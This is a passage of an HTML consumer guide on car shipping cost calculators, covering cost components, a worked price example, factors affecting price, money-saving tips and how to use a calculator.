          <li>
            <strong>Market Awareness:</strong> Stay informed about market rates
            and avoid overpaying for services.
          </li>
        </ul>

        <h3>6. Enhanced Planning and Scheduling</h3>
        <p>
          A cost calculator helps in planning and scheduling your vehicle
          transport more effectively. By knowing the estimated cost and
          timeline, you can coordinate other aspects of your move or travel
          plans seamlessly.
        </p>
        <ul>
          <li>
            <strong>Timeline Management:</strong> Plan your vehicle pickup and
            delivery dates in sync with your moving schedule.
          </li>
          <li>
            <strong>Coordination:</strong> Coordinate with other service
            providers, such as movers or travel arrangements, ensuring a smooth
            transition.
          </li>
          <li>
            <strong>Flexibility:</strong> Adjust plans based on cost and timing,
            allowing for a more tailored and efficient process.
          </li>
        </ul>

        <h3>7. Improved Trust and Confidence</h3>
        <p>
          Using a cost calculator from a reputable auto transport company can
          build trust and confidence in their services. Seeing a transparent and
          reasonable estimate reassures you of the company’s credibility and
          reliability.
        </p>
        <ul>
          <li>
            <strong>Credibility:</strong> A clear, detailed estimate reflects
            the company's professionalism and transparency.
          </li>
          <li>
            <strong>Reassurance:</strong> Knowing the cost upfront and having a
            reliable estimate enhances peace of mind.
          </li>
          <li>
            <strong>Customer Satisfaction:</strong> Transparent pricing
            contributes to overall customer satisfaction and trust.
          </li>
        </ul>

        <h3>8. Streamlined Booking Process</h3>
        <p>
          Many car shipping cost calculators integrate seamlessly with the
          booking process, making it easier to move from getting an estimate to
          finalizing your shipment.
        </p>
        <ul>
          <li>
            <strong>Integrated Systems:</strong> Directly proceed from the cost
            calculator to booking, streamlining the process.
          </li>
          <li>
            <strong>Automated Entry:</strong> Information entered into the
            calculator can be automatically transferred to the booking form,
            reducing duplication and errors.
          </li>
          <li>
            <strong>Efficiency:</strong> Simplified process saves time and
            effort, leading to a more efficient experience.
          </li>
        </ul>

        <h3>Case Study: How a Cost Calculator Saved Time and Money</h3>
        <p>
          Consider John, a classic car enthusiast who needed to transport his
          newly purchased vintage car from Miami, FL to San Francisco, CA. By
          using a car shipping cost calculator, John was able to:
        </p>
        <ul>
          <li>
            Receive a detailed estimate within minutes, including the breakdown
            of costs for enclosed transport to protect his valuable vehicle.
          </li>
          <li>
            Compare quotes from multiple providers, ultimately selecting a
            company that offers the best balance of price and service.
          </li>
          <li>
            Plan his budget effectively, ensuring he had allocated sufficient
            funds for the transport without any financial surprises.
          </li>
          <li>
            Schedule the transport in line with his availability, avoiding peak
            season charges and benefiting from off-peak rates.
          </li>
        </ul>
        <p>
          John's experience highlights how a car shipping cost calculator can
          simplify the auto transport process, ensuring a smooth and
          cost-effective experience.
        </p>

        <p>
          In the next section, we will provide a detailed breakdown of car
          shipping costs, helping you understand the various components that
          make up the total price and how each factor impacts your estimate.
          This knowledge will further empower you to make informed decisions
          about your vehicle transport needs.
        </p>

        <h2>Detailed Breakdown of Car Shipping Costs</h2>
        <p>
          Understanding the components that contribute to the total cost of car
          shipping is essential for making informed decisions. By breaking down
          the various factors, you can gain a clearer picture of how each
          element influences the overall price. This section will provide a
          comprehensive overview of the different cost components involved in
          vehicle transport.
        </p>

        <h3>1. Base Price</h3>
        <p>
          The base price is the fundamental charge for shipping your vehicle and
          serves as the starting point for calculating the total cost. It
          typically covers the standard expenses associated with transport, such
          as fuel, labor, and carrier maintenance.
        </p>
        <ul>
          <li>
            <strong>Standard Rates:</strong> Base prices are often determined by
            industry standards and vary between companies.
          </li>
          <li>
            <strong>Basic Services:</strong> Includes the cost of transporting
            the vehicle from point A to point B without any additional services
            or special requirements.
          </li>
        </ul>

        <h3>2. Distance Costs</h3>
        <p>
          Distance is a primary factor in determining car shipping costs. The
          longer the distance, the higher the cost due to increased fuel
          consumption, driver time, and wear and tear on the transport vehicle.
        </p>
        <ul>
          <li>
            <strong>Mileage Rates:</strong> Costs are usually calculated based
            on the number of miles between the pickup and delivery locations.
          </li>
          <li>
            <strong>Long-Distance Shipping:</strong> Longer routes may benefit
            from economies of scale, resulting in lower per-mile costs.
          </li>
          <li>
            <strong>Short-Distance Shipping:</strong> Shorter routes might have
            higher per-mile rates due to fixed operational costs spread over a
            smaller distance.
          </li>
        </ul>

        <h3>3. Vehicle Size and Weight</h3>
        <p>
          The size and weight of your vehicle play a significant role in
          determining shipping costs. Larger and heavier vehicles require more
          space and resources, leading to higher prices.
        </p>
        <ul>
          <li>
            <strong>Standard Vehicles:</strong> Sedans and smaller cars
            generally cost less to ship.
          </li>
          <li>
            <strong>Large Vehicles:</strong> SUVs, trucks, and vans incur higher
            charges due to their size and weight.
          </li>
          <li>
            <strong>Specialty Vehicles:</strong> Luxury cars, classic cars, and
            oversized vehicles may require special handling, further increasing
            costs.
          </li>
        </ul>

        <h3>4. Transport Type</h3>
        <p>
          The type of transport you choose can significantly impact the cost.
          There are two main types of car transport services: open and enclosed
          transport.
        </p>
        <ul>
          <li>
            <strong>Open Transport:</strong> Cost-effective, but vehicles are
            exposed to weather and road conditions.
          </li>
          <li>
            <strong>Enclosed Transport:</strong> Provides protection but at a
            higher cost, ideal for luxury, classic, or high-value vehicles.
          </li>
        </ul>

        <h3>5. Pickup and Delivery Locations</h3>
        <p>
          The location of your pickup and delivery points can affect the
          shipping cost. Urban and rural areas present different challenges and
          cost implications.
        </p>
        <ul>
          <li>
            <strong>Urban Areas:</strong> Generally less expensive due to higher
            demand and better accessibility.
          </li>
          <li>
            <strong>Rural Areas:</strong> Can be more costly due to fewer
            transport routes and increased travel time for carriers.
          </li>
          <li>
            <strong>Remote Locations:</strong> Additional fees may apply for
            hard-to-reach areas or locations far from major highways.
          </li>
        </ul>

        <h3>6. Seasonal Variations</h3>
        <p>
          The time of year you choose to ship your vehicle can impact the cost.
          Demand for auto transport services fluctuates with the seasons,
          affecting prices.
        </p>
        <ul>
          <li>
            <strong>Peak Seasons:</strong> Higher demand during summer months
            and holidays can drive up prices.
          </li>
          <li>
            <strong>Off-Peak Seasons:</strong> Lower demand in fall and winter
            can result in cost savings.
          </li>
          <li>
            <strong>Snowbird Season:</strong> Increased demand during winter
            months for routes between northern and southern states.
          </li>
        </ul>

        <h3>7. Additional Services</h3>
        <p>
          Additional services can enhance the convenience and security of your
          vehicle transport but also add to the total cost.
        </p>
        <ul>
          <li>
            <strong>Door-to-Door Service:</strong> Offers convenience by picking
            up and delivering your vehicle directly at specified locations.
          </li>
          <li>
            <strong>Expedited Shipping:</strong> Prioritizes your vehicle for
            faster delivery, often at a premium rate.
          </li>
          <li>
            <strong>Insurance Coverage:</strong> Provides extra protection for
            high-value vehicles, increasing the overall cost.
          </li>
        </ul>

        <h3>8. Fuel Prices</h3>
        <p>
          Fluctuations in fuel prices can influence car shipping costs. Higher
          fuel prices generally lead to increased shipping rates as carriers
          adjust their pricing to cover fuel expenses.
        </p>
        <ul>
          <li>
            <strong>Fuel Surcharges:</strong> Some companies may apply fuel
            surcharges based on current market rates.
          </li>
          <li>
            <strong>Rate Adjustments:</strong> Transport rates may be adjusted
            periodically to reflect changes in fuel costs.
          </li>
        </ul>

        <h3>9. Carrier Availability</h3>
        <p>
          The availability of carriers can affect shipping costs. Supply and
          demand dynamics play a crucial role in determining prices.
        </p>
        <ul>
          <li>
            <strong>High Demand:</strong> Limited availability during peak
            seasons can drive up prices.
          </li>
          <li>
            <strong>Low Demand:</strong> Greater availability during off-peak
            times can result in competitive pricing and potential discounts.
          </li>
        </ul>

        <h3>Example of a Detailed Cost Breakdown</h3>
        <p>
          To illustrate how these factors come together to determine the total
          cost, consider the following example:
        </p>
        <ul>
          <li><strong>Vehicle Details:</strong> 2019 Toyota Camry, operable</li>
          <li>
            <strong>Pickup Location:</strong> Los Angeles, CA (urban area)
          </li>
          <li><strong>Delivery Location:</strong> Dallas, TX (urban area)</li>
          <li><strong>Transport Type:</strong> Open transport</li>
          <li><strong>Distance:</strong> Approximately 1,450 miles</li>
          <li>
            <strong>Shipping Dates:</strong> Flexible within a two-week window
          </li>
          <li><strong>Additional Services:</strong> Door-to-door service</li>
        </ul>
        <p>Estimated Cost Breakdown:</p>
        <ul>
          <li><strong>Base Price:</strong> $400</li>
          <li>
            <strong>Distance Costs:</strong> $0.50 per mile x 1,450 miles = $725
          </li>
          <li>
            <strong>Vehicle Size and Weight Adjustment:</strong> Standard
            vehicle = $0
          </li>
          <li>
            <strong>Transport Type Adjustment:</strong> Open transport = $0
          </li>
          <li><strong>Location Adjustment:</strong> Urban to urban = $0</li>
          <li><strong>Seasonal Adjustment:</strong> Flexible dates = $0</li>
          <li>
            <strong>Additional Services:</strong> Door-to-door service = $150
          </li>
          <li>
            <strong>Fuel Surcharge:</strong> $50 (based on current fuel prices)
          </li>
          <li><strong>Carrier Availability:</strong> No additional cost</li>
        </ul>
        <p><strong>Total Estimated Cost:</strong> $1,325</p>

        <p>
          By understanding each component that contributes to the total cost,
          you can make more informed decisions about your car shipping needs.
          This detailed breakdown empowers you to identify areas where you might
          save money or choose additional services for added convenience and
          protection.
        </p>

        <p>
          In the next section, we will discuss the various factors affecting car
          shipping costs in greater detail, providing further insights into how
          each element impacts the final price. This knowledge will help you
          better navigate the auto transport process and ensure you get the best
          value for your money.
        </p>

        <h2>Factors Affecting Car Shipping Costs</h2>
        <p>
          When it comes to car shipping, several key factors play a crucial role
          in determining the final cost. Understanding these factors can help
          you make informed decisions and better manage your budget. In this
          section, we will delve deeper into each factor that influences car
          shipping costs and provide practical tips for navigating these
          variables.
        </p>

        <h3>1. Distance</h3>
        <p>
          <strong>Overview:</strong> The distance between the pickup and
          delivery locations is one of the most significant factors affecting
          car shipping costs. Longer distances generally result in higher prices
          due to increased fuel consumption, driver hours, and wear and tear on
          the transport vehicle.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Mileage Rates:</strong> Many auto transport companies charge
            per mile, with rates decreasing as the distance increases.
          </li>
          <li>
            <strong>Economies of Scale:</strong> Longer trips may benefit from
            economies of scale, where the per-mile cost decreases.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Plan Efficient Routes:</strong> If possible, choose routes
            that align with major highways and are frequently traveled by
            carriers to minimize costs.
          </li>
          <li>
            <strong>Consider Terminal-to-Terminal Shipping:</strong> For long
            distances, terminal-to-terminal shipping might be more
            cost-effective than door-to-door service.
          </li>
        </ul>

        <h3>2. Vehicle Size and Weight</h3>
        <p>
          <strong>Overview:</strong> The size and weight of your vehicle
          significantly impact the shipping cost. Larger and heavier vehicles
          require more space and resources, leading to higher prices.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Standard Vehicles:</strong> Smaller cars like sedans are
            generally less expensive to transport.
          </li>
          <li>
            <strong>Large Vehicles:</strong> SUVs, trucks, and vans are more
            costly due to their size and weight.
          </li>
          <li>
            <strong>Specialty Vehicles:</strong> Classic cars, luxury cars, and
            other specialty vehicles may require additional handling and
            protection, increasing the cost.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Accurate Information:</strong> Provide accurate details
            about your vehicle’s size and weight to get an accurate estimate.
          </li>
          <li>
            <strong>Remove Excess Weight:</strong> If possible, remove any heavy
            items from the vehicle to reduce weight and lower costs.
          </li>
        </ul>

        <h3>3. Transport Type</h3>
        <p>
          <strong>Overview:</strong> The type of transport you choose (open or
          enclosed) greatly affects the shipping cost. Open transport is more
          common and affordable, while enclosed transport offers extra
          protection at a higher price.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Open Transport:</strong> Vehicles are shipped on open
            trailers, exposed to weather and road conditions. It is the most
            economical option.
          </li>
          <li>
            <strong>Enclosed Transport:</strong> Vehicles are shipped in
            enclosed trailers, offering protection from the elements. This is
            ideal for high-value, luxury, or classic cars but comes with a
            higher price tag.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Weigh the Risks:</strong> Consider the value of your vehicle
            and the level of protection you need. For standard vehicles, open
            transport is usually sufficient.
          </li>
          <li>
            <strong>Seasonal Considerations:</strong> Enclosed transport might
            be more necessary during harsh weather conditions.
          </li>
        </ul>

        <h3>4. Pickup and Delivery Locations</h3>
        <p>
          <strong>Overview:</strong> The geographical locations of the pickup
          and delivery points can influence the cost. Urban areas with easy
          access to highways are generally cheaper compared to rural or remote
          areas.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Urban Areas:</strong> High demand and better accessibility
            typically result in lower costs.
          </li>
          <li>
            <strong>Rural Areas:</strong> Limited access and fewer transport
            routes can increase costs.
          </li>
          <li>
            <strong>Remote Locations:</strong> Additional fees may apply for
            locations far from major highways or transport hubs.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Flexible Locations:</strong> If possible, consider picking
            up or delivering your vehicle in a nearby urban area to reduce
            costs.
          </li>
          <li>
            <strong>Plan Ahead:</strong> Early planning can help secure lower
            rates, especially for rural or remote areas.
          </li>
        </ul>

        <h3>5. Seasonal Variations</h3>
        <p>
          <strong>Overview:</strong> The time of year you choose to ship your
          vehicle can affect the cost due to varying demand levels. Peak seasons
          tend to have higher prices, while off-peak seasons offer cost savings.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Peak Seasons:</strong> Summer months and holiday periods see
            increased demand, leading to higher prices.
          </li>
          <li>
            <strong>Off-Peak Seasons:</strong> Fall and winter months generally
            have lower demand, resulting in lower costs.
          </li>
          <li>
            <strong>Snowbird Season:</strong> Winter migration of snowbirds can
            affect prices for routes between northern and southern states.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Flexibility:</strong> If your schedule allows, opt for
            shipping during off-peak seasons to take advantage of lower rates.
          </li>
          <li>
            <strong>Book in Advance:</strong> Booking early during peak seasons
            can help secure better rates and availability.
          </li>
        </ul>

        <h3>6. Fuel Prices</h3>
        <p>
          <strong>Overview:</strong> Fluctuations in fuel prices can impact car
          shipping costs as transport companies adjust their rates to cover fuel
          expenses.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Fuel Surcharges:</strong> Some companies include fuel
            surcharges based on current market rates.
          </li>
          <li>
            <strong>Rate Adjustments:</strong> Shipping rates may be
            periodically adjusted to reflect changes in fuel costs.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Monitor Fuel Prices:</strong> Keep an eye on fuel price
            trends when planning your shipment to anticipate potential cost
            changes.
          </li>
          <li>
            <strong>Fixed Rates:</strong> Some companies offer fixed rates that
            include fuel costs, providing price stability.
          </li>
        </ul>

        <h3>7. Carrier Availability</h3>
        <p>
          <strong>Overview:</strong> The availability of carriers can affect
          shipping costs. High demand for carriers can lead to increased prices,
          while greater availability can result in competitive pricing.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>High Demand:</strong> Limited carrier availability during
            peak seasons or popular routes can drive up prices.
          </li>
          <li>
            <strong>Low Demand:</strong> Greater availability during off-peak
            times or less popular routes can lead to cost savings.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Flexible Scheduling:</strong> Being flexible with your
            shipping dates can help secure lower rates.
          </li>
          <li>
            <strong>Advance Booking:</strong> Book your transport early to
            ensure availability and potentially lower costs.
          </li>
        </ul>

        <h3>8. Additional Services</h3>
        <p>
          <strong>Overview:</strong> Additional services such as door-to-door
          delivery, expedited shipping, and insurance coverage can enhance the
          convenience and security of your vehicle transport but also add to the
          overall cost.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Door-to-Door Service:</strong> Offers convenience by picking
            up and delivering your vehicle directly at specified locations.
          </li>
          <li>
            <strong>Expedited Shipping:</strong> Prioritizes your vehicle for
            faster delivery, often at a premium rate.
          </li>
          <li>
            <strong>Insurance Coverage:</strong> Provides extra protection for
            high-value vehicles, increasing the overall cost.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Evaluate Needs:</strong> Assess which additional services
            are necessary based on your specific requirements and budget.
          </li>
          <li>
            <strong>Compare Offers:</strong> Different companies offer varying
            packages for additional services. Compare to find the best value.
          </li>
        </ul>

        <h3>Example Scenario: Understanding the Impact of Factors</h3>
        <p>
          Let’s consider Sarah, who needs to ship her 2020 Honda Civic from New
          York City, NY to Austin, TX. By analyzing the factors affecting the
          cost, Sarah can make informed decisions:
        </p>
        <ul>
          <li><strong>Distance:</strong> Approximately 1,750 miles.</li>
          <li><strong>Vehicle Size:</strong> Standard sedan.</li>
          <li><strong>Transport Type:</strong> Open transport.</li>
          <li><strong>Pickup Location:</strong> Urban area (New York City).</li>
          <li><strong>Delivery Location:</strong> Urban area (Austin).</li>
          <li><strong>Season:</strong> Summer (peak season).</li>
          <li><strong>Additional Services:</strong> Door-to-door service.</li>
        </ul>
        <p>
          Based on these factors, Sarah can use a car shipping cost calculator
          to get an accurate estimate and plan her budget. She can also consider
          adjusting her shipment details, such as choosing a different season or
          location, to optimize costs.
        </p>

        <p>
          Understanding the various factors that influence car shipping costs
          enables you to make smarter choices and manage your budget
          effectively. In the next section, we will provide practical tips for
          reducing car shipping costs, helping you find the best deals without
          compromising on service quality.
        </p>

        <h2>Practical Tips for Reducing Car Shipping Costs</h2>
        <p>
          Reducing car shipping costs without compromising on the quality of
          service is possible with careful planning and strategic
          decision-making. This section offers practical tips to help you
          minimize expenses while ensuring your vehicle is transported safely
          and efficiently.
        </p>

        <h3>1. Compare Multiple Quotes</h3>
        <p>
          One of the most effective ways to reduce car shipping costs is by
          obtaining and comparing quotes from multiple auto transport companies.
          This allows you to identify the best deal and avoid overpaying for
          services.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Quote Comparison:</strong> Request quotes from at least
            three to five different companies.
          </li>
          <li>
            <strong>Service Evaluation:</strong> Compare not only the prices but
            also the services included in each quote.
          </li>
          <li>
            <strong>Negotiation:</strong> Use the quotes as leverage to
            negotiate better rates with your preferred company.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Online Tools:</strong> Use online car shipping cost
            calculators to get instant quotes from multiple providers.
          </li>
          <li>
            <strong>Transparent Quotes:</strong> Ensure that the quotes are
            detailed and transparent, including all potential fees and
            surcharges.
          </li>
        </ul>

        <h3>2. Opt for Terminal-to-Terminal Shipping</h3>
        <p>
          Choosing terminal-to-terminal shipping instead of door-to-door service
          can significantly reduce costs. This option involves dropping off and
          picking up your vehicle at designated terminals rather than specific
          addresses.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Cost Savings:</strong> Terminal-to-terminal shipping
            eliminates the need for carriers to navigate local streets, reducing
            labor and fuel costs.
          </li>
          <li>
            <strong>Convenience Trade-Off:</strong> While less convenient than
            door-to-door service, the cost savings can be substantial.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Proximity:</strong> Ensure that the terminals are reasonably
            close to your locations to avoid excessive travel.
          </li>
          <li>
            <strong>Flexible Timing:</strong> Be flexible with drop-off and
            pick-up times to align with the terminal's operating hours.
          </li>
        </ul>

        <h3>3. Schedule Shipping During Off-Peak Seasons</h3>
        <p>
          Shipping your vehicle during off-peak seasons can help you take
          advantage of lower rates due to reduced demand.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Peak Seasons:</strong> Avoid summer months, holidays, and
            winter migration periods (snowbird season).
          </li>
          <li>
            <strong>Off-Peak Benefits:</strong> Fall and winter months typically
            offer lower rates and more carrier availability.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Flexible Dates:</strong> If your schedule allows, plan your
            shipment during off-peak times to secure better rates.
          </li>
          <li>
            <strong>Advance Planning:</strong> Book your transport well in
            advance to lock in lower prices before peak season surcharges apply.
          </li>
        </ul>

        <h3>4. Choose Open Transport</h3>
        <p>
          Opting for open transport instead of enclosed transport can lead to
          significant cost savings. Open transport is the most common and
          economical method for shipping vehicles.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Cost-Effective:</strong> Open transport is typically 30-50%
            cheaper than enclosed transport.
          </li>
          <li>
            <strong>Suitable for Standard Vehicles:</strong> Ideal for most
            standard vehicles that do not require extra protection.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Evaluate Protection Needs:</strong> Consider the value and
            condition of your vehicle to determine if open transport is
            suitable.
          </li>
          <li>
            <strong>Seasonal Considerations:</strong> Ensure the weather
            conditions along the route are favorable to avoid potential exposure
            issues.
          </li>
        </ul>

        <h3>5. Be Flexible with Pickup and Delivery Dates</h3>
        <p>
          Flexibility with your shipping dates can lead to cost savings.
          Carriers may offer lower rates for more flexible schedules.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Flexible Scheduling:</strong> Allowing a wider window for
            pickup and delivery can help carriers optimize their routes and
            reduce costs.
          </li>
          <li>
            <strong>Avoid Urgent Shipments:</strong> Expedited shipping services
            come at a premium. Plan ahead to avoid the need for rush services.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Advance Booking:</strong> Book your transport as early as
            possible to take advantage of flexible scheduling discounts.
          </li>
          <li>
            <strong>Communication:</strong> Communicate your flexibility to the
            transport company to explore potential cost savings.
          </li>
        </ul>

        <h3>6. Remove Personal Items and Excess Weight</h3>
        <p>
          Removing personal items and reducing the weight of your vehicle can
          lower shipping costs. Auto transport companies may charge extra for
          additional weight and do not cover personal belongings.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Weight Reduction:</strong> Lighter vehicles are less
            expensive to ship.
          </li>
          <li>
            <strong>Safety and Insurance:</strong> Removing personal items
            ensures they are not lost or damaged, as they are not covered by the
            transport company’s insurance.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Clear Out Vehicle:</strong> Remove all personal belongings,
            aftermarket accessories, and any non-essential items.
          </li>
          <li>
            <strong>Check Weight Limits:</strong> Verify the vehicle’s weight
            and ensure it complies with the transport company’s limits.
          </li>
        </ul>

        <h3>7. Use Discounts and Promotions</h3>
        <p>
          Take advantage of available discounts and promotions to reduce your
          car shipping costs. Many companies offer special rates for various
          customers and situations.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Seasonal Promotions:</strong> Look for discounts during
            certain times of the year, such as holidays or end-of-season sales.
          </li>
          <li>
            <strong>Membership Discounts:</strong> Some companies offer
            discounts for members of specific organizations, military personnel,
            students, and seniors.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Ask About Discounts:</strong> Inquire about any available
            discounts or promotions when requesting a quote.
          </li>
          <li>
            <strong>Membership Benefits:</strong> Check if your membership in
            certain organizations qualifies you for special rates.
          </li>
        </ul>

        <h3>8. Understand Insurance Coverage</h3>
        <p>
          Understanding the insurance coverage provided by the transport company
          can help you avoid unnecessary additional costs. Ensure your vehicle
          is adequately covered during transport.
        </p>
        <p><strong>Details:</strong></p>
        <ul>
          <li>
            <strong>Standard Coverage:</strong> Most reputable transport
            companies include basic insurance coverage in their quotes.
          </li>
          <li>
            <strong>Additional Coverage:</strong> Assess whether you need
            additional insurance for high-value or specialty vehicles.
          </li>
        </ul>
        <p><strong>Tips:</strong></p>
        <ul>
          <li>
            <strong>Verify Coverage:</strong> Confirm the details of the
            included insurance coverage and any potential deductibles.
          </li>
          <li>
            <strong>Supplemental Insurance:</strong> Consider purchasing
            supplemental insurance if the standard coverage does not meet your
            needs.
          </li>
        </ul>

        <h3>Example: Reducing Costs for a Long-Distance Move</h3>
        <p>
          Consider Maria, who needs to ship her 2018 Honda Accord from Chicago,
          IL to Los Angeles, CA. By applying the practical tips outlined above,
          Maria can significantly reduce her shipping costs:
        </p>
        <ul>
          <li>
            <strong>Compare Quotes:</strong> Maria requests quotes from five
            different transport companies and chooses the most cost-effective
            option with transparent pricing.
          </li>
          <li>
            <strong>Terminal-to-Terminal Shipping:</strong> She opts for
            terminal-to-terminal service, dropping off and picking up her
            vehicle at convenient locations in both cities.
          </li>
          <li>
            <strong>Off-Peak Season:</strong> Maria schedules her shipment for
            early fall, avoiding the summer peak season and securing lower
            rates.
          </li>
          <li>
            <strong>Open Transport:</strong> She chooses open transport, as her
            standard vehicle does not require extra protection.
          </li>
          <li>
            <strong>Flexible Dates:</strong> Maria provides a two-week window
            for pickup and delivery, allowing the transport company to optimize
            their schedule and offer a discount.
          </li>
          <li>
            <strong>Remove Items:</strong> She removes all personal belongings
            and excess weight from her vehicle to avoid additional charges.
          </li>
          <li>
            <strong>Use Discounts:</strong> Maria inquires about available
            discounts and applies a promotional code offered by the transport
            company.
          </li>
        </ul>
        <p>
          By strategically applying these tips, Maria reduces her shipping cost
          from an initial quote of $1,400 to a final cost of $1,000, saving $400
          without compromising the quality of service.
        </p>

        <p>
          In the next section, we will provide a comprehensive guide on how to
          use a car shipping cost calculator effectively. This guide will
          include step-by-step instructions, tips for getting the most accurate
          estimates, and common pitfalls to avoid.
        </p>

        <h2>How to Use a Car Shipping Cost Calculator Effectively</h2>
        <p>
          A car shipping cost calculator is an invaluable tool for anyone
          looking to transport a vehicle. It provides an estimate of shipping
          costs based on various factors such as distance, vehicle type, and
          transport method. This section will guide you through the process of
          using a car shipping cost calculator effectively, ensuring you get the
          most accurate and beneficial estimates.
        </p>

        <h3>Step-by-Step Guide to Using a Car Shipping Cost Calculator</h3>
        <h4>Gather Necessary Information</h4>
        <p>
          Before using a car shipping cost calculator, gather all the necessary
          information about your vehicle and shipping requirements. This
          includes:
        </p>
        <ul>
          <li>
            <strong>Vehicle Details:</strong> Make, model, year, and condition
            (running or non-running).
          </li>
          <li>
            <strong>Pickup and Delivery Locations:</strong> Exact addresses or
            ZIP codes.
          </li>
          <li>
            <strong>Transport Preferences:</strong> Open or enclosed transport,
            terminal-to-terminal or door-to-door service.
          </li>
          <li><strong>Timing:</strong> Preferred pickup and delivery dates.</li>
        </ul>
        <h4>Access a Reliable Car Shipping Cost Calculator</h4>
        <p>
          Choose a reputable car shipping cost calculator, ideally provided by a
          well-known auto transport company or an industry-recognized platform.
          Ensure the calculator is up-to-date and accurate.
        </p>
        <h4>Enter the Vehicle Information</h4>
        <p>
          Input the details of your vehicle, including make, model, year, and
          condition. This information helps the calculator estimate the space
          and weight requirements for shipping.
        </p>
        <h4>Provide Pickup and Delivery Details</h4>
        <p>
          Enter the exact pickup and delivery locations. Accurate location
          information is crucial for a precise estimate, as it affects the
          distance and route planning.
        </p>
        <h4>Select Transport Preferences</h4>
        <p>
          Choose your preferred transport method (open or enclosed) and service
          type (terminal-to-terminal or door-to-door). These choices will
          influence the cost estimate.
        </p>
        <h4>Specify Timing Requirements</h4>
        <p>
          Enter your preferred pickup and delivery dates. Flexible dates might
          offer more cost-effective options, as carriers can better optimize
          their routes.
        </p>
        <h4>Review and Adjust</h4>
        <p>
          Review the initial estimate provided by the calculator. Adjust any
          inputs if necessary to see how changes impact the cost. This can help
          you find a balance between cost and service preferences.
        </p>
        <h4>Request Detailed Quotes</h4>
        <p>
          Use the cost calculator to request detailed quotes from multiple auto
          transport companies. This allows you to compare services, prices, and
          terms before making a decision.
        </p>

        <h3>Tips for Getting the Most Accurate Estimates</h3>
        <ul>
          <li>
            <strong>Be Precise with Information:</strong> Ensure all information
            entered into the calculator is accurate and detailed. Inaccurate
            information can lead to misleading estimates.
          </li>
          <li>
            <strong>Consider Seasonal Variations:</strong> Be aware of how
            seasonal demand can affect shipping costs. Use the calculator to
            check rates for different times of the year.
          </li>
          <li>
            <strong>Evaluate Different Transport Options:</strong> Experiment
            with different transport methods (open vs. enclosed) and service
            types (terminal-to-terminal vs. door-to-door) to see how they impact
            the cost.
          </li>
          <li>
            <strong>Account for Additional Services:</strong> Consider any
            additional services you might need, such as expedited shipping or
            additional insurance, and include these in your estimate.
          </li>
        </ul>

        <h3>Common Pitfalls to Avoid</h3>
        <ul>
          <li>
            <strong>Ignoring Hidden Fees:</strong> Be wary of calculators that
            do not clearly display all potential fees. Always request a detailed
            quote that includes all charges.
          </li>
          <li>
            <strong>Relying on a Single Estimate:</strong> Do not rely on a
            single estimate from one calculator. Use multiple calculators to get
            a comprehensive view of potential costs.
          </li>
          <li>
            <strong>Overlooking Company Reputation:</strong> While cost is
            important, do not ignore the reputation and reliability of the auto
            transport company. Choose companies with good reviews and industry
            accreditation.
          </li>
          <li>
            <strong>Neglecting to Confirm Insurance:</strong> Ensure that the
            cost estimate includes adequate insurance coverage for your vehicle.
            Understand what is covered and consider additional insurance if
            necessary.
          </li>
        </ul>

        <p>
          Using a car shipping cost calculator effectively can save you time and
          money while ensuring your vehicle is transported safely and
          efficiently. By following the steps and tips outlined in this guide,
          you can obtain accurate cost estimates, compare services, and make
          informed decisions about your auto transport needs.
        </p>

        <p>
          In conclusion, car shipping cost calculators are powerful tools that,
          when used correctly, provide valuable insights into the cost and
          logistics of transporting your vehicle. Whether you're shipping a car
          across the country or just a few states away, understanding how to
          navigate these calculators will help you secure the best rates and
          services. Remember to gather all necessary information, compare
          multiple quotes, and choose a reliable transport company to ensure a
          smooth and cost-effective shipping experience.
        </p>

        <h2>Ensuring a Smooth Auto Transport Experience</h2>
        <p>
          Once you've selected an auto transport company and booked your vehicle
          shipment, there are several steps you can take to ensure a smooth and
          hassle-free experience. This section will guide you through the
          preparations and actions to take before, during, and after the auto
          transport process.
        </p>

        <h3>Before Vehicle Pickup</h3>
        <h4>Prepare Your Vehicle</h4>
        <p>
          <strong>Cleanliness:</strong> Wash your vehicle thoroughly, both
          inside and out, to facilitate a clear inspection before loading.
        </p>
        <p>
          <strong>Document Condition:</strong> Document any existing damage or
